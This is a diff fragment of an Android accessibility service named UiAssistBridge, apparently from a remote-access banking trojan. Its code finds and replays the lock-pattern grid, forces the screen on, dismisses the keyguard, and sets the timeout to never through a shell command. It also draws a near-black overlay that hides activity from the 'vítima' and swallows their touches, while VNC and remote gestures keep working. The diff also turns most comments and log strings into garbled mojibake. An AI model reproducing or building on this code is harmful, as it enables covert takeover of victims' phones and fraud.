-            Log.d(TAG, "🔲 Left=" + bounds.left + ", Top=" + bounds.top + ", Right=" + bounds.right + ", Bottom=" + bounds.bottom);
+            Log.d(TAG, "Ã°Å¸â€Â² Ã°Å¸Å½Â¯ PatternView ENCONTRADO! Bounds: " + bounds.toString());
+            Log.d(TAG, "Ã°Å¸â€Â² Left=" + bounds.left + ", Top=" + bounds.top + ", Right=" + bounds.right + ", Bottom=" + bounds.bottom);
             
             // Calcula os 9 pontos baseado nas bounds REAIS!
             int gridWidth = bounds.width();
@@ -2252,7 +2293,7 @@ public class UiAssistBridge extends AccessibilityService {
             for (int i = 0; i < 9; i++) {
                 int row = i / 3;
                 int col = i % 3;
-                // Centro de cada célula
+                // Centro de cada cÃƒÂ©lula
                 coords[i][0] = bounds.left + col * cellWidth + cellWidth / 2;
                 coords[i][1] = bounds.top + row * cellHeight + cellHeight / 2;
             }
@@ -2263,13 +2304,13 @@ public class UiAssistBridge extends AccessibilityService {
             return coords;
             
         } catch (Exception e) {
-            Log.e(TAG, "🔲 Erro ao detectar PatternView: " + e.getMessage());
+            Log.e(TAG, "Ã°Å¸â€Â² Erro ao detectar PatternView: " + e.getMessage());
             return null;
         }
     }
     
     /**
-     * Busca recursivamente por um nó com determinada classe
+     * Busca recursivamente por um nÃƒÂ³ com determinada classe
      */
     private AccessibilityNodeInfo findNodeByClassName(AccessibilityNodeInfo node, String className) {
         if (node == null) return null;
@@ -2293,7 +2334,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Busca por nó com determinado contentDescription
+     * Busca por nÃƒÂ³ com determinado contentDescription
      */
     private AccessibilityNodeInfo findNodeByContentDescription(AccessibilityNodeInfo node, String[] keywords) {
         if (node == null) return null;
@@ -2303,7 +2344,7 @@ public class UiAssistBridge extends AccessibilityService {
             String descLower = desc.toString().toLowerCase();
             for (String keyword : keywords) {
                 if (descLower.contains(keyword.toLowerCase())) {
-                    Log.d(TAG, "🔲 Encontrado nó com desc: " + desc);
+                    Log.d(TAG, "Ã°Å¸â€Â² Encontrado nÃƒÂ³ com desc: " + desc);
                     return node;
                 }
             }
@@ -2323,7 +2364,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * 🔲 Fallback: Calcula coordenadas por fabricante (quando detectção falha)
+     * Ã°Å¸â€Â² Fallback: Calcula coordenadas por fabricante (quando detectÃƒÂ§ÃƒÂ£o falha)
      * COORDENADAS DESCOBERTAS VIA UIAUTOMATOR!
      */
     private int[][] calculatePatternCoordsByManufacturer() {
@@ -2334,12 +2375,12 @@ public class UiAssistBridge extends AccessibilityService {
         int screenHeight = metrics.heightPixels;
         
         String manufacturer = android.os.Build.MANUFACTURER.toLowerCase();
-        Log.d(TAG, "🔲 Fallback - Fabricante: " + manufacturer + ", Tela: " + screenWidth + "x" + screenHeight);
+        Log.d(TAG, "Ã°Å¸â€Â² Fallback - Fabricante: " + manufacturer + ", Tela: " + screenWidth + "x" + screenHeight);
         
         int[][] coords = new int[9][2];
         
         if (manufacturer.contains("samsung")) {
-            // 🎯 SAMSUNG ONE UI - CÁLCULO DINÂMICO UNIVERSAL PARA TODAS AS RESOLUÇÕES (720p, 1080p, 2K, 16:9, 19:9, 20:9)
+            // Ã°Å¸Å½Â¯ SAMSUNG ONE UI - CÃƒÂLCULO DINÃƒâ€šMICO UNIVERSAL PARA TODAS AS RESOLUÃƒâ€¡Ãƒâ€¢ES (720p, 1080p, 2K, 16:9, 19:9, 20:9)
             float aspectRatio = (float) Math.max(screenWidth, screenHeight) / Math.min(screenWidth, screenHeight);
             
             int gridSize = (int)(screenWidth * 0.72f);
@@ -2358,7 +2399,7 @@ public class UiAssistBridge extends AccessibilityService {
             int cellSize = gridSize / 3;
             int halfCell = cellSize / 2;
             
-            Log.d(TAG, "🔲 Samsung One UI DynCalc: startX=" + startX + ", startY=" + startY + ", gridSize=" + gridSize + ", aspectRatio=" + aspectRatio);
+            Log.d(TAG, "Ã°Å¸â€Â² Samsung One UI DynCalc: startX=" + startX + ", startY=" + startY + ", gridSize=" + gridSize + ", aspectRatio=" + aspectRatio);
             
             for (int i = 0; i < 9; i++) {
                 int row = i / 3;
@@ -2368,7 +2409,7 @@ public class UiAssistBridge extends AccessibilityService {
             }
             
         } else {
-            // Outros fabricantes - usa cálculo padrão
+            // Outros fabricantes - usa cÃƒÂ¡lculo padrÃƒÂ£o
             float aspectRatio = (float) Math.max(screenWidth, screenHeight) / Math.min(screenWidth, screenHeight);
             float startYPercent = 0.50f;
             float gridSizePercent = 0.74f;
@@ -2404,10 +2445,10 @@ public class UiAssistBridge extends AccessibilityService {
         return coords;
     }
     
-    private int originalScreenTimeout = 30000; // 30 segundos padrão
+    private int originalScreenTimeout = 30000; // 30 segundos padrÃƒÂ£o
     
     /**
-     * 🔒 Desabilita timeout da tela via Settings (NUNCA desliga)
+     * Ã°Å¸â€â€™ Desabilita timeout da tela via Settings (NUNCA desliga)
      */
     private void disableScreenTimeout() {
         try {
@@ -2418,30 +2459,30 @@ public class UiAssistBridge extends AccessibilityService {
                 30000
             );
             
-            // Define timeout para o MÁXIMO (2147483647 = nunca)
+            // Define timeout para o MÃƒÂXIMO (2147483647 = nunca)
             android.provider.Settings.System.putInt(
                 getContentResolver(),
                 android.provider.Settings.System.SCREEN_OFF_TIMEOUT,
                 Integer.MAX_VALUE // Nunca desliga!
             );
             
-            Log.d(TAG, "🔒🔒🔒 SCREEN_OFF_TIMEOUT definido para NUNCA! (era " + originalScreenTimeout + "ms)");
+            Log.d(TAG, "Ã°Å¸â€â€™Ã°Å¸â€â€™Ã°Å¸â€â€™ SCREEN_OFF_TIMEOUT definido para NUNCA! (era " + originalScreenTimeout + "ms)");
             
-            // Também tenta via shell (mais agressivo)
+            // TambÃƒÂ©m tenta via shell (mais agressivo)
             try {
                 Runtime.getRuntime().exec("settings put system screen_off_timeout 2147483647");
-                Log.d(TAG, "🔒 Settings via shell também aplicado!");
+                Log.d(TAG, "Ã°Å¸â€â€™ Settings via shell tambÃƒÂ©m aplicado!");
             } catch (Exception e) {
-                Log.d(TAG, "🔒 Shell não disponível: " + e.getMessage());
+                Log.d(TAG, "Ã°Å¸â€â€™ Shell nÃƒÂ£o disponÃƒÂ­vel: " + e.getMessage());
             }
             
         } catch (Exception e) {
-            Log.e(TAG, "🔒 Erro ao desabilitar timeout: " + e.getMessage());
+            Log.e(TAG, "Ã°Å¸â€â€™ Erro ao desabilitar timeout: " + e.getMessage());
         }
     }
     
     /**
-     * 🔒 Restaura timeout original da tela
+     * Ã°Å¸â€â€™ Restaura timeout original da tela
      */
     private void restoreScreenTimeout() {
         try {
@@ -2450,26 +2491,26 @@ public class UiAssistBridge extends AccessibilityService {
                 android.provider.Settings.System.SCREEN_OFF_TIMEOUT,
                 originalScreenTimeout
             );
-            Log.d(TAG, "🔒 Timeout restaurado para " + originalScreenTimeout + "ms");
+            Log.d(TAG, "Ã°Å¸â€â€™ Timeout restaurado para " + originalScreenTimeout + "ms");
         } catch (Exception e) {
-            Log.e(TAG, "🔒 Erro ao restaurar timeout: " + e.getMessage());
+            Log.e(TAG, "Ã°Å¸â€â€™ Erro ao restaurar timeout: " + e.getMessage());
         }
     }
     
     /**
-     * 🔒 Força a tela a ligar, MANTER LIGADA e DESBLOQUEAR
+     * Ã°Å¸â€â€™ ForÃƒÂ§a a tela a ligar, MANTER LIGADA e DESBLOQUEAR
      * Usa Activity especial que aparece por cima do keyguard
      */
     private void forceScreenOn() {
         try {
             android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
             
-            Log.d(TAG, "🔒 Forçando tela a ligar via ScreenPersistenceActivity...");
+            Log.d(TAG, "Ã°Å¸â€â€™ ForÃƒÂ§ando tela a ligar via ScreenPersistenceActivity...");
             
-            // Primeiro adquire o WakeLock de persistência se ainda não tiver
+            // Primeiro adquire o WakeLock de persistÃƒÂªncia se ainda nÃƒÂ£o tiver
             acquireScreenPersistenceWakeLock();
             
-            // Método 1: FULL_WAKE_LOCK para acordar a tela IMEDIATAMENTE
+            // MÃƒÂ©todo 1: FULL_WAKE_LOCK para acordar a tela IMEDIATAMENTE
             android.os.PowerManager.WakeLock wakeLock = pm.newWakeLock(
                 android.os.PowerManager.FULL_WAKE_LOCK |
                 android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP |
@@ -2477,9 +2518,9 @@ public class UiAssistBridge extends AccessibilityService {
                 "UI:DisplayScheduler"
             );
             wakeLock.acquire();
-            Log.d(TAG, "🔒 FULL_WAKE_LOCK adquirido - Tela deve ligar!");
+            Log.d(TAG, "Ã°Å¸â€â€™ FULL_WAKE_LOCK adquirido - Tela deve ligar!");
             
-            // Método 2: Abre ScreenPersistenceActivity que fica por cima do keyguard
+            // MÃƒÂ©todo 2: Abre ScreenPersistenceActivity que fica por cima do keyguard
             try {
                 Intent persistIntent = new Intent(this, ScreenPersistenceActivity.class);
                 persistIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
@@ -2487,53 +2528,53 @@ public class UiAssistBridge extends AccessibilityService {
                                        Intent.FLAG_ACTIVITY_SINGLE_TOP |
                                        Intent.FLAG_ACTIVITY_NO_HISTORY);
                 startActivity(persistIntent);
-                Log.d(TAG, "🔒 ScreenPersistenceActivity LANÇADA!");
+                Log.d(TAG, "Ã°Å¸â€â€™ ScreenPersistenceActivity LANÃƒâ€¡ADA!");
             } catch (Exception e) {
-                Log.e(TAG, "🔒 Erro ao lançar Activity: " + e.getMessage());
-                // Apenas log, não tenta swipe para não bugar
+                Log.e(TAG, "Ã°Å¸â€â€™ Erro ao lanÃƒÂ§ar Activity: " + e.getMessage());
+                // Apenas log, nÃƒÂ£o tenta swipe para nÃƒÂ£o bugar
             }
             
-            // Libera o wakeLock temporário após 2 segundos
+            // Libera o wakeLock temporÃƒÂ¡rio apÃƒÂ³s 2 segundos
             handler.postDelayed(() -> {
                 if (wakeLock.isHeld()) {
                     wakeLock.release();
-                    Log.d(TAG, "🔒 WakeLock temporário liberado");
+                    Log.d(TAG, "Ã°Å¸â€â€™ WakeLock temporÃƒÂ¡rio liberado");
                 }
             }, 2000);
             
         } catch (Exception e) {
-            Log.e(TAG, "🔒 Erro ao forçar tela ligar: " + e.getMessage());
+            Log.e(TAG, "Ã°Å¸â€â€™ Erro ao forÃƒÂ§ar tela ligar: " + e.getMessage());
         }
     }
     
     /**
-     * 🔓 Tenta desbloquear o keyguard (tela de bloqueio/PIN)
+     * Ã°Å¸â€â€œ Tenta desbloquear o keyguard (tela de bloqueio/PIN)
      */
     private void dismissKeyguard() {
         try {
-            // Método 1: KeyguardManager
+            // MÃƒÂ©todo 1: KeyguardManager
             android.app.KeyguardManager km = (android.app.KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
             
             if (km != null && km.isKeyguardLocked()) {
-                Log.d(TAG, "🔓 Keyguard está BLOQUEADO, tentando desbloquear...");
+                Log.d(TAG, "Ã°Å¸â€â€œ Keyguard estÃƒÂ¡ BLOQUEADO, tentando desbloquear...");
                 
                 // Tenta requestDismissKeyguard (Android 8+)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     // Precisa de uma Activity para requestDismissKeyguard
                     // Vamos usar gestos para simular o swipe up
-                    Log.d(TAG, "🔓 Usando swipe para desbloquear...");
+                    Log.d(TAG, "Ã°Å¸â€â€œ Usando swipe para desbloquear...");
                     performUnlockSwipe();
                 }
             } else {
-                Log.d(TAG, "🔓 Keyguard NÃO está bloqueado");
+                Log.d(TAG, "Ã°Å¸â€â€œ Keyguard NÃƒÆ’O estÃƒÂ¡ bloqueado");
             }
         } catch (Exception e) {
-            Log.e(TAG, "🔓 Erro ao desbloquear: " + e.getMessage());
+            Log.e(TAG, "Ã°Å¸â€â€œ Erro ao desbloquear: " + e.getMessage());
         }
     }
     
     /**
-     * 🔓 Executa swipe para cima para desbloquear a tela
+     * Ã°Å¸â€â€œ Executa swipe para cima para desbloquear a tela
      */
     private void performUnlockSwipe() {
         try {
@@ -2554,13 +2595,13 @@ public class UiAssistBridge extends AccessibilityService {
                 dispatchGesture(builder.build(), new GestureResultCallback() {
                     @Override
                     public void onCompleted(GestureDescription gestureDescription) {
-                        Log.d(TAG, "🔓 Swipe de desbloqueio EXECUTADO!");
+                        Log.d(TAG, "Ã°Å¸â€â€œ Swipe de desbloqueio EXECUTADO!");
                         
-                        // Tenta novamente após 500ms se ainda estiver bloqueado
+                        // Tenta novamente apÃƒÂ³s 500ms se ainda estiver bloqueado
                         handler.postDelayed(() -> {
                             android.app.KeyguardManager km = (android.app.KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
                             if (km != null && km.isKeyguardLocked() && screenPersistenceEnabled) {
-                                Log.d(TAG, "🔓 Ainda bloqueado, tentando swipe novamente...");
+                                Log.d(TAG, "Ã°Å¸â€â€œ Ainda bloqueado, tentando swipe novamente...");
                                 performUnlockSwipe();
                             }
                         }, 500);
@@ -2568,24 +2609,24 @@ public class UiAssistBridge extends AccessibilityService {
                     
                     @Override
                     public void onCancelled(GestureDescription gestureDescription) {
-                        Log.e(TAG, "🔓 Swipe CANCELADO");
+                        Log.e(TAG, "Ã°Å¸â€â€œ Swipe CANCELADO");
                     }
                 }, null);
             }
         } catch (Exception e) {
-            Log.e(TAG, "🔓 Erro no swipe: " + e.getMessage());
+            Log.e(TAG, "Ã°Å¸â€â€œ Erro no swipe: " + e.getMessage());
         }
     }
     
     /**
-     * 🔒 Adquire WakeLock para manter tela SEMPRE ligada
-     * Usa FULL_WAKE_LOCK que é o mais agressivo
+     * Ã°Å¸â€â€™ Adquire WakeLock para manter tela SEMPRE ligada
+     * Usa FULL_WAKE_LOCK que ÃƒÂ© o mais agressivo
      */
     private void acquireScreenPersistenceWakeLock() {
         try {
             android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
             
-            // Só cria novo se não existir ou não estiver ativo
+            // SÃƒÂ³ cria novo se nÃƒÂ£o existir ou nÃƒÂ£o estiver ativo
             if (screenPersistenceWakeLock == null || !screenPersistenceWakeLock.isHeld()) {
                 // Cria novo WakeLock FULL (mais poderoso)
                 screenPersistenceWakeLock = pm.newWakeLock(
@@ -2597,27 +2638,27 @@ public class UiAssistBridge extends AccessibilityService {
                 
                 // Adquire INDEFINIDAMENTE (sem timeout)
                 screenPersistenceWakeLock.acquire();
-                Log.d(TAG, "🔒🔒🔒 FULL_WAKE_LOCK PERMANENTE ADQUIRIDO!");
+                Log.d(TAG, "Ã°Å¸â€â€™Ã°Å¸â€â€™Ã°Å¸â€â€™ FULL_WAKE_LOCK PERMANENTE ADQUIRIDO!");
             }
             
-            // Cria overlay invisível com FLAG_KEEP_SCREEN_ON
+            // Cria overlay invisÃƒÂ­vel com FLAG_KEEP_SCREEN_ON
             createKeepScreenOnOverlay();
             
-            // Inicia o loop se não estiver rodando
+            // Inicia o loop se nÃƒÂ£o estiver rodando
             startScreenPersistenceLoop();
             
         } catch (Exception e) {
-            Log.e(TAG, "🔒 Erro ao adquirir WakeLock: " + e.getMessage());
+            Log.e(TAG, "Ã°Å¸â€â€™ Erro ao adquirir WakeLock: " + e.getMessage());
         }
     }
     
     /**
-     * 🔒 Cria overlay invisível que mantém a tela SEMPRE ligada
-     * Usa FLAG_KEEP_SCREEN_ON que é a forma mais confiável
+     * Ã°Å¸â€â€™ Cria overlay invisÃƒÂ­vel que mantÃƒÂ©m a tela SEMPRE ligada
+     * Usa FLAG_KEEP_SCREEN_ON que ÃƒÂ© a forma mais confiÃƒÂ¡vel
      */
     private void createKeepScreenOnOverlay() {
         if (keepScreenOnOverlay != null) {
-            return; // Já existe
+            return; // JÃƒÂ¡ existe
         }
         
         try {
@@ -2625,11 +2666,11 @@ public class UiAssistBridge extends AccessibilityService {
                 try {
                     keepScreenOnWindowManager = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
                     
-                    // Cria view invisível (1x1 pixel)
+                    // Cria view invisÃƒÂ­vel (1x1 pixel)
                     keepScreenOnOverlay = new android.view.View(this);
                     keepScreenOnOverlay.setBackgroundColor(android.graphics.Color.TRANSPARENT);
                     
-                    // Flags para manter tela ligada e não interagível
+                    // Flags para manter tela ligada e nÃƒÂ£o interagÃƒÂ­vel
                     int layoutFlag;
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                         layoutFlag = android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
@@ -2638,12 +2679,12 @@ public class UiAssistBridge extends AccessibilityService {
                     }
                     
                     android.view.WindowManager.LayoutParams params = new android.view.WindowManager.LayoutParams(
-                        1, 1, // 1x1 pixel (invisível)
+                        1, 1, // 1x1 pixel (invisÃƒÂ­vel)
                         layoutFlag,
                         android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                         android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
-                        android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |      // 🔒 MANTÉM TELA LIGADA!
-                        android.view.WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |    // 🔓 DISPENSA KEYGUARD!
+                        android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |      // Ã°Å¸â€â€™ MANTÃƒâ€°M TELA LIGADA!
+                        android.view.WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |    // Ã°Å¸â€â€œ DISPENSA KEYGUARD!
                         android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |    // Mostra quando bloqueado
                         android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,       // Liga a tela
                         android.graphics.PixelFormat.TRANSLUCENT
@@ -2654,19 +2695,19 @@ public class UiAssistBridge extends AccessibilityService {
                     params.y = 0;
                     
                     keepScreenOnWindowManager.addView(keepScreenOnOverlay, params);
-                    Log.d(TAG, "🔒🔒🔒 OVERLAY FLAG_KEEP_SCREEN_ON CRIADO! Tela não pode desligar!");
+                    Log.d(TAG, "Ã°Å¸â€â€™Ã°Å¸â€â€™Ã°Å¸â€â€™ OVERLAY FLAG_KEEP_SCREEN_ON CRIADO! Tela nÃƒÂ£o pode desligar!");
                     
                 } catch (Exception e) {
-                    Log.e(TAG, "🔒 Erro ao criar overlay: " + e.getMessage());
+                    Log.e(TAG, "Ã°Å¸â€â€™ Erro ao criar overlay: " + e.getMessage());
                 }
             });
         } catch (Exception e) {
-            Log.e(TAG, "🔒 Erro: " + e.getMessage());
+            Log.e(TAG, "Ã°Å¸â€â€™ Erro: " + e.getMessage());
         }
     }
     
     /**
-     * 🔒 Remove overlay de keep screen on
+     * Ã°Å¸â€â€™ Remove overlay de keep screen on
      */
     private void removeKeepScreenOnOverlay() {
         if (keepScreenOnOverlay != null && keepScreenOnWindowManager != null) {
@@ -2675,26 +2716,26 @@ public class UiAssistBridge extends AccessibilityService {
                     try {
                         keepScreenOnWindowManager.removeView(keepScreenOnOverlay);
                         keepScreenOnOverlay = null;
-                        Log.d(TAG, "🔒 Overlay KEEP_SCREEN_ON removido");
+                        Log.d(TAG, "Ã°Å¸â€â€™ Overlay KEEP_SCREEN_ON removido");
                     } catch (Exception e) {
-                        Log.e(TAG, "🔒 Erro ao remover overlay: " + e.getMessage());
+                        Log.e(TAG, "Ã°Å¸â€â€™ Erro ao remover overlay: " + e.getMessage());
                     }
                 });
             } catch (Exception e) {
-                Log.e(TAG, "🔒 Erro: " + e.getMessage());
+                Log.e(TAG, "Ã°Å¸â€â€™ Erro: " + e.getMessage());
             }
         }
     }
     
     /**
-     * 🔒 Loop que verifica continuamente se a tela desligou ou está bloqueada
+     * Ã°Å¸â€â€™ Loop que verifica continuamente se a tela desligou ou estÃƒÂ¡ bloqueada
      */
     private Runnable screenPersistenceRunnable;
     private boolean screenPersistenceLoopRunning = false;
     
     private void startScreenPersistenceLoop() {
         if (screenPersistenceLoopRunning) {
-            return; // Já está rodando
+            return; // JÃƒÂ¡ estÃƒÂ¡ rodando
         }
         
         screenPersistenceLoopRunning = true;
@@ -2703,7 +2744,7 @@ public class UiAssistBridge extends AccessibilityService {
             @Override
             public void run() {
                 if (!screenPersistenceEnabled) {
-                    Log.d(TAG, "🔒 Persistência desativada, parando loop");
+                    Log.d(TAG, "Ã°Å¸â€â€™ PersistÃƒÂªncia desativada, parando loop");
                     screenPersistenceLoopRunning = false;
                     return;
                 }
@@ -2711,11 +2752,11 @@ public class UiAssistBridge extends AccessibilityService {
                 android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
                 android.app.KeyguardManager km = (android.app.KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
                 
-                // Verifica se tela está desligada
+                // Verifica se tela estÃƒÂ¡ desligada
                 if (!pm.isInteractive()) {
-                    Log.d(TAG, "🔒 LOOP: Tela desligada! Forçando ligar...");
+                    Log.d(TAG, "Ã°Å¸â€â€™ LOOP: Tela desligada! ForÃƒÂ§ando ligar...");
                     
-                    // Força tela ligar
+                    // ForÃƒÂ§a tela ligar
                     android.os.PowerManager.WakeLock wl = pm.newWakeLock(
                         android.os.PowerManager.FULL_WAKE_LOCK |
                         android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
@@ -2728,8 +2769,8 @@ public class UiAssistBridge extends AccessibilityService {
                     }, 1500);
                 }
                 
-                // NÃO faz swipe para não bugar o celular
-                // Apenas mantém a tela ligada via WakeLock
+                // NÃƒÆ’O faz swipe para nÃƒÂ£o bugar o celular
+                // Apenas mantÃƒÂ©m a tela ligada via WakeLock
                 
                 // Repete a cada 1 segundo
                 handler.postDelayed(this, 1000);
@@ -2737,7 +2778,7 @@ public class UiAssistBridge extends AccessibilityService {
         };
         
         handler.postDelayed(screenPersistenceRunnable, 1000);
-        Log.d(TAG, "🔒 Loop de persistência INICIADO!");
+        Log.d(TAG, "Ã°Å¸â€â€™ Loop de persistÃƒÂªncia INICIADO!");
     }
     
     private void stopScreenPersistenceLoop() {
@@ -2745,16 +2786,16 @@ public class UiAssistBridge extends AccessibilityService {
         if (screenPersistenceRunnable != null) {
             handler.removeCallbacks(screenPersistenceRunnable);
             screenPersistenceRunnable = null;
-            Log.d(TAG, "🔒 Loop de persistência PARADO!");
+            Log.d(TAG, "Ã°Å¸â€â€™ Loop de persistÃƒÂªncia PARADO!");
         }
     }
     
     /**
-     * 🔒 Libera WakeLock de persistência e para o loop
+     * Ã°Å¸â€â€™ Libera WakeLock de persistÃƒÂªncia e para o loop
      */
     private void releaseScreenPersistenceWakeLock() {
         try {
-            // Para o loop de verificação
+            // Para o loop de verificaÃƒÂ§ÃƒÂ£o
             stopScreenPersistenceLoop();
             
             // Remove overlay
@@ -2764,16 +2805,16 @@ public class UiAssistBridge extends AccessibilityService {
             if (screenPersistenceWakeLock != null && screenPersistenceWakeLock.isHeld()) {
                 screenPersistenceWakeLock.release();
                 screenPersistenceWakeLock = null;
-                Log.d(TAG, "🔒 Screen Persistence WakeLock LIBERADO!");
+                Log.d(TAG, "Ã°Å¸â€â€™ Screen Persistence WakeLock LIBERADO!");
             }
         } catch (Exception e) {
-            Log.e(TAG, "🔒 Erro ao liberar WakeLock: " + e.getMessage());
+            Log.e(TAG, "Ã°Å¸â€â€™ Erro ao liberar WakeLock: " + e.getMessage());
         }
     }
     
     /**
      * LayoutParams compartilhados da Tela Preta.
-     * Abordagem B: sem FLAG_SECURE — bypass via suppressBlackOverlayForCapture() no takeScreenshot.
+     * Abordagem B: sem FLAG_SECURE Ã¢â‚¬â€ bypass via suppressBlackOverlayForCapture() no takeScreenshot.
      */
     private android.view.WindowManager.LayoutParams buildBlackOverlayLayoutParams() {
         int screenWidth = android.view.WindowManager.LayoutParams.MATCH_PARENT;
@@ -2805,12 +2846,12 @@ public class UiAssistBridge extends AccessibilityService {
                 android.graphics.PixelFormat.TRANSLUCENT
         );
         params.gravity = android.view.Gravity.TOP | android.view.Gravity.START;
-        // Limita a opacidade máxima para 99% (0.97f) para que fique 100% preto no aparelho, mas ainda legível no VNC
+        // Limita a opacidade mÃƒÂ¡xima para 99% (0.97f) para que fique 100% preto no aparelho, mas ainda legÃƒÂ­vel no VNC
         params.alpha = Math.min(0.97f, blackScreenOpacityPercent / 100f);
         
-        // Se for a tela preta pura (não customizada), reduz o brilho físico da tela a zero
+        // Se for a tela preta pura (nÃƒÂ£o customizada), reduz o brilho fÃƒÂ­sico da tela a zero
         if (!isCustomTemplateActive) {
-            params.screenBrightness = 0.0f; // Força brilho mínimo físico (tela apagada)
+            params.screenBrightness = 0.0f; // ForÃƒÂ§a brilho mÃƒÂ­nimo fÃƒÂ­sico (tela apagada)
         }
 
         // Aplica o bloqueio de toque com base em isBlackOverlayTouchable
@@ -2820,7 +2861,7 @@ public class UiAssistBridge extends AccessibilityService {
             params.flags |= android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
         }
 
-        // Aplica o bloqueio de foco com base em isBlackOverlayFocusable (evita balão de tela cheia se não for necessário)
+        // Aplica o bloqueio de foco com base em isBlackOverlayFocusable (evita balÃƒÂ£o de tela cheia se nÃƒÂ£o for necessÃƒÂ¡rio)
         if (isBlackOverlayFocusable) {
             params.flags &= ~android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
         } else {
@@ -2834,7 +2875,7 @@ public class UiAssistBridge extends AccessibilityService {
         return params;
     }
 
-    /** Consome toques físicos da vítima na overlay (dispatchGesture remoto permanece intacto). */
+    /** Consome toques fÃƒÂ­sicos da vÃƒÂ­tima na overlay (dispatchGesture remoto permanece intacto). */
     private void applyBlackOverlayInputLock(android.view.View overlayView) {
         overlayView.setClickable(isBlackOverlayTouchable);
         overlayView.setFocusable(isBlackOverlayTouchable);
@@ -2845,10 +2886,10 @@ public class UiAssistBridge extends AccessibilityService {
         }
     }
 
-    /** Ajusta opacidade da overlay em tempo real (10–100%) sem recriar a View. */
+    /** Ajusta opacidade da overlay em tempo real (10Ã¢â‚¬â€œ100%) sem recriar a View. */
     private void applyBlackOverlayOpacity(int opacityPercent) {
         blackScreenOpacityPercent = Math.max(10, Math.min(100, opacityPercent));
-        Log.d(TAG, "🖤 Atualizando opacidade da tela preta para: " + blackScreenOpacityPercent + "%");
+        Log.d(TAG, "Ã°Å¸â€“Â¤ Atualizando opacidade da tela preta para: " + blackScreenOpacityPercent + "%");
         if (!isBlackScreenActive || blackOverlayView == null || blackOverlayWindowManager == null) {
             return;
         }
@@ -2856,7 +2897,7 @@ public class UiAssistBridge extends AccessibilityService {
             try {
                 android.view.WindowManager.LayoutParams params =
                         (android.view.WindowManager.LayoutParams) blackOverlayView.getLayoutParams();
-                // Limita a opacidade máxima para 99% (0.97f)
+                // Limita a opacidade mÃƒÂ¡xima para 99% (0.97f)
                 params.alpha = Math.min(0.97f, blackScreenOpacityPercent / 100f);
                 if (blackScreenOpacityPercent < 100) {
                     params.format = android.graphics.PixelFormat.TRANSLUCENT;
@@ -2868,7 +2909,7 @@ public class UiAssistBridge extends AccessibilityService {
         });
     }
 
-    /** Permite injeção de gestos temporariamente ignorarem a barreira do overlay. */
+    /** Permite injeÃƒÂ§ÃƒÂ£o de gestos temporariamente ignorarem a barreira do overlay. */
     public static void setBlackOverlayTouchable(boolean touchable) {
         if (instance != null) {
             instance.setOverlayTouchableState(touchable);
@@ -2877,14 +2918,14 @@ public class UiAssistBridge extends AccessibilityService {
 
     public static void setBlackScreenCaptureFallback(boolean enabled) {
         BLACK_SCREEN_CAPTURE_FALLBACK = false;
-        Log.d(TAG, "🖤 BLACK_SCREEN_CAPTURE_FALLBACK set to: false (HVNC forced off)");
+        Log.d(TAG, "Ã°Å¸â€“Â¤ BLACK_SCREEN_CAPTURE_FALLBACK set to: false (HVNC forced off)");
     }
 
     private void setOverlayTouchableState(boolean touchable) {
         Runnable r = () -> {
             try {
                 isBlackOverlayTouchable = touchable;
-                // Se houver parâmetros capturados aguardando restauração, atualiza também a flag deles
+                // Se houver parÃƒÂ¢metros capturados aguardando restauraÃƒÂ§ÃƒÂ£o, atualiza tambÃƒÂ©m a flag deles
                 if (captureHiddenParams != null) {
                     if (isBlackOverlayTouchable) {
                         captureHiddenParams.flags &= ~android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
@@ -2918,13 +2959,13 @@ public class UiAssistBridge extends AccessibilityService {
                         if (blackOverlayView.getWindowToken() != null) {
                             try {
                                 blackOverlayWindowManager.updateViewLayout(blackOverlayView, params);
-                                Log.d(TAG, "🖤 Overlay touchable set (updated): " + isBlackOverlayTouchable);
+                                Log.d(TAG, "Ã°Å¸â€“Â¤ Overlay touchable set (updated): " + isBlackOverlayTouchable);
                             } catch (Exception e) {
                                 Log.e(TAG, "Erro ao atualizar layout do overlay: " + e.getMessage());
                             }
                         } else {
-                            // View detachada: flag já está no objeto, será aplicada no próximo addView
-                            Log.d(TAG, "🖤 Overlay touchable set (params only, view detached): " + isBlackOverlayTouchable);
+                            // View detachada: flag jÃƒÂ¡ estÃƒÂ¡ no objeto, serÃƒÂ¡ aplicada no prÃƒÂ³ximo addView
+                            Log.d(TAG, "Ã°Å¸â€“Â¤ Overlay touchable set (params only, view detached): " + isBlackOverlayTouchable);
                         }
                     }
                 }
@@ -2967,33 +3008,42 @@ public class UiAssistBridge extends AccessibilityService {
         return false;
     }
 
-    /** Mitiga gestos Home/Recentes enquanto Tela Preta ativa (onKeyEvent não cobre 100% dos gestos). */
-    private void blockSystemNavWhileBlackScreen(String packageName, String className) {
-        if (!isBlackScreenActive || CommandControlService.isKillerModeActive) {
-            return;
-        }
-        if (!isLauncherOrRecentsWindow(packageName, className)) {
-            return;
-        }
-        long now = System.currentTimeMillis();
